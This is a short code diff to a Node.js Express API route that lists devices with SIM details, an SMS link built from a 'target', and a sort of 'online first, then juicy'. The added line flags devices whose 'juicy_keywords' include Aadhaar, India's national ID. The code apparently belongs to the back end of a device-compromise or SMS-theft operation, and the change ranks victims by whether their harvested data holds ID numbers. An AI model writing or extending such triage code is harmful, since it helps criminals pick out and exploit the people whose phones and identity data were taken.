@@ -254,6 +254,7 @@ app.get('/api/url/:id', (req, res) => {
       sim1Enriched:  dev.sim1_enriched || [],
       sim2Enriched:  dev.sim2_enriched || [],
       smsLink:       getSmsLink(target, deviceId, dev.obj_id),
+      hasAadhaar:    (dev.juicy_keywords || []).some(k => /aadh/i.test(k)),
     }))
     .sort((a, b) => {
       // online first, then juicy, then by lastActivity desc
